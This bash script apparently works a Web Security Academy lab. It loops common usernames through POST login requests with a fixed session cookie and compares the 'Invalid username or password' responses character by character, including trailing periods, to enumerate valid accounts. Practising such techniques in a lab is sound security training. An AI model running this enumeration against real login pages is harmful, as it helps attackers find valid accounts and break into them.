#!/bin/bash

echo "Comparing error messages character by character..."
echo "==============================================="
echo ""

# Get response for first few users and look for differences
for user in carlos root admin test guest info adm mysql user administrator; do
    response=$(curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test")
    
    # Extract just the error paragraph and surrounding context
    error_context=$(echo "$response" | grep -A2 -B2 "Invalid username or password" | tr '\n' ' ')
    
    # Also check for any period differences
    periods=$(echo "$response" | grep -o "Invalid username or password\." | wc -l)
    no_periods=$(echo "$response" | grep -o "Invalid username or password[^.]" | wc -l)
    
    echo "User: $user"
    echo "  Periods after error: $periods"
    echo "  No period instances: $no_periods"
    echo "  Error context: ${error_context:0:200}..."
    echo ""
done